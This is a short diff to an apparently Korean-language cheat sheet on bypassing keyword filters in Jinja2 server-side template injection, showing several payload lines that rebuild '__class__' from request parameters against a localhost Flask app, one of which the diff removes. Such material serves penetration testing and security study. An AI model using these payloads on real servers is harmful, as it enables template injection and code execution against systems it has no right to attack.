@@ -225,9 +225,6 @@ request|attr(request.args.c) #Send a param like "?c=__class__
 request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
 request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
 http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params
-
-http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
-
 ```
 
 ### 모든 키워드가 막혔을 시 rqeuest 객가 Filtering 안되었다면?
